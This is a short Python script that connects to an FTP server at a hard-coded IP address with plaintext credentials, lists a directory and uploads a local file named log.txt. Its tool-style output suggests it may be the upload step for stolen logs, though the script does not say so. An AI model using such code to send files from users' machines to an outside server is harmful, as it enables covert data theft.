import ftplib

# Router routes all uploads from port 21 to server  
username = "x"
password = "liminal"
ftp_addr = "85.49.8.152"
ftp_port = 21
try:
    # Defining FTP session and logging on to server
    session = ftplib.FTP()
    session.connect(ftp_addr, ftp_port)
    session.login(username, password)
    print("[*] Connected to FTP server")
    
    # Changing directory and "LSing"
    session.cwd("/ftp")
    files = session.dir()
    print(files)
    file = open("log.txt", "rb")
    session.storbinary("STOR log.txt", file)
    file.close()
    print("[*] File uploaded successfully")
    session.quit()
    print("[*] Disconnected from FTP server")

# Spits out any errors 
except Exception as e:
    print(f"Error {e}", )